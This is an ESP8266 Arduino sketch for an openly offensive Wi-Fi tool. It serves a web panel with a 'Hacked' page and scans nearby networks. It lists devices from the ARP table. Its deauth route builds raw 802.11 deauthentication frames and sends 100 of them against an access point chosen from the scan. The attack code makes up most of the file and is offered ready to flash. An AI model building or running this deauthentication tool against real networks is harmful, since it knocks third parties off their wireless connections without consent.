#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <lwip/etharp.h>

// AP Credentials
const char* ap_ssid = "ESP8266";
const char* ap_password = "1234567890";

// Start HTTP Server
ESP8266WebServer server(80);

// Deauth Variables
String targetSSID = "";
int targetChannel = 1;
uint8_t targetMac[6];

// SSID and Pass to Connect a AP
String ssid;
String password;

// AP Settings
void setupAP() {
  Serial.println("Starting AP...");
  WiFi.softAP(ap_ssid, ap_password);

  // HTTP Server Routes
  server.on("/", handleRoot);
  server.on("/invade", handleInvade);
  server.on("/submit", HTTP_POST, handleSubmit);
  server.on("/settings", handleSettings);
  server.on("/scanner", handleWifiScanner);
  server.on("/deauth", handleAttackDeauth);
  server.on("/arp", handleARP);
  server.begin();
  
  Serial.println("HTTP Server Started...");
}

// Root page (Use for ArpSpoof)
void handleRoot() {
  String htmlRoot = "<html><head><title>Hacked!!!</title><style>html{background-color:black;color:white;}</style><body><h1>Hacked</h1><h4>by. Unknown</h4></body></html>";
  server.send(200, "text/html", htmlRoot);
}

// Function to Connect a Other AP
void handleInvade() {
  String html = "<html><head><title>Esp8266 | SSID Config</title>";
  html += "<style>html{background-color:black;color:purple;}.ssid-input{background-color:black;color:blue;}";
  html += ".pass-input{background-color:black;color:blue;}.button-input{background-color:black;color:purple;}</style></head>";
  html += "<body><h1>AP Connection Config</h1>";
  html += "<form action='/submit' method='POST'>";
  html += "SSID : <input type='text' name='ssid' class='ssid-input'><br>";
  html += "Pass : <input type='password' name='password' class='pass-input'><br>";
  html += "<input type='submit' value='Connect' class='button-input'></form></body></html>";
  server.send(200, "text/html", html);
}

// SSID and Pass Form Processing
void handleSubmit() {
  ssid = server.arg("ssid");
  password = server.arg("password");

  String message = "Trying to Connect SSID : " + ssid;
  server.send(200, "text/html", message);

  delay(1000);
  WiFi.softAPdisconnect(true);
  connectToWiFi();
}

// Connect Esp8266 to AP
void connectToWiFi() {
  WiFi.begin(ssid.c_str(), password.c_str());

  int attempts = 0;
  while (WiFi.status() != WL_CONNECTED && attempts < 20) {
    delay(500);
    Serial.print(".");
    attempts++;
  }

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println("\nConnected to AP");
    startWebServer();
  } else {
    Serial.println("Fail to Connect a AP");
    setupAP();
  }
}

// Functionto Restart Server After Connected AP
void startWebServer() {
  server.on("/", []() {
    server.send(200, "text/html", "<h1>Connected to AP!</h1>");
  });
  server.begin();
  Serial.println("Servidor HTTP iniciado");
}

// Settings Page
void handleSettings() {
  String htmlConfig = "<html><head><title>Esp8266 | Settings</title>";
  htmlConfig += "<style>html{background-color:black;color:purple;}.link{color:red;}</style></head>";
  htmlConfig += "<body><h1>Esp8266 : Settings</h1>";
  htmlConfig += "<h4>Pages:</h4>";
  htmlConfig += "<a href='/' class='link'>Root</a><br>";
  htmlConfig += "<a href='/invade' class='link'>SSID Invade</a><br>";
  htmlConfig += "<a href='/scanner' class='link'>AP Scanner</a><br>";
  htmlConfig += "<a href='/arp' class='link'>ARP List</a></body></html>";
  server.send(200, "text/html", htmlConfig);
}

// AP Scanner
void handleWifiScanner() {
  int numNetworks = WiFi.scanNetworks();
  String html = "<html><head><style>html{background-color:black;color:purple}</style><title>Esp8266 | AP Scan</title></head><body><h1>Avaliable APs</h1><ul>";

  for (int i = 0; i < numNetworks; i++) {
    html += "<li><a href=\"/deauth?ssid=" + WiFi.SSID(i) + "&channel=" + String(WiFi.channel(i)) +
            "&mac=" + WiFi.BSSIDstr(i) + "\">" + WiFi.SSID(i) + " (Canal " + String(WiFi.channel(i)) + ")</a></li>";
  }

  html += "</ul></body></html>";

  server.send(200, "text/html", html);
}

// ARP List
void handleARP() {
  String html = "<html><head><title>Esp8266 | ARP List</title><style>html{background-color:black;color:purple}</style></head><body>";
  html += "<h1>Connected Devices</h1><table border='1'><tr><th>IPv4</th><th>MAC Address</th></tr>";

  size_t i = 0;
  ip4_addr_t *ipaddr;
  struct netif *netif;
  struct eth_addr *eth_ret;

  // Loop to Verify Connected Devices
  while (etharp_get_entry(i, &ipaddr, &netif, &eth_ret) == 1) {
    if (ipaddr != NULL && eth_ret != NULL) {
      html += "<tr><td>";
      html += IPAddress(ipaddr->addr).toString();
      html += "</td><td>";
      html += formatMacAddress(eth_ret->addr);
      html += "</td></tr>";
    }
    i++;
  }

  html += "</table></body></html>";
  
  server.send(200, "text/html", html);
}

// Deauth Function
void deauthAttack(uint8_t *targetMac) {
  for (int i = 0; i < 100; i++) {
    sendDeauthFrame(targetMac);
    delay(10);
  }
}

// Send Deauth Packages
void sendDeauthFrame(uint8_t *targetMac) {
  uint8_t deauthPacket[] = {
    0xC0, 0x00, 0x3A, 0x01, 
    targetMac[0], targetMac[1], targetMac[2], 
    targetMac[3], targetMac[4], targetMac[5], 
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
    0x00, 0x00, 
    0x07, 0x00
  };
  wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
}

// Start Deauth Attack
void handleAttackDeauth() {
  if (server.hasArg("ssid") && server.hasArg("channel") && server.hasArg("mac")) {
    targetSSID = server.arg("ssid");
    targetChannel = server.arg("channel").toInt();
    String macStr = server.arg("mac");

    WiFi.mode(WIFI_STA);
    WiFi.disconnect();

    sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &targetMac[0], &targetMac[1], &targetMac[2], &targetMac[3], &targetMac[4], &targetMac[5]);

    wifi_set_channel(targetChannel);
    deauthAttack(targetMac);

    server.send(200, "text/html", "<html><body><h1>Ataque deauth iniciado contra a rede: " + targetSSID + "</h1></body></html>");
  } else {
    server.send(400, "text/html", "Parâmetros inválidos! Certifique-se de passar SSID, canal e endereço MAC.");
  }
}

// Mac Format
String formatMacAddress(uint8_t *mac) {
  String macStr = "";
  for (int i = 0; i < 6; i++) {
    if (mac[i] < 0x10) {
      macStr += "0";
    }
    macStr += String(mac[i], HEX);
    if (i < 5) {
      macStr += ":";
    }
  }
  return macStr;
}

void setup() {
  Serial.begin(115200);
  setupAP();  // Start Esp8266 AP
}

void loop() {
  server.handleClient();
}
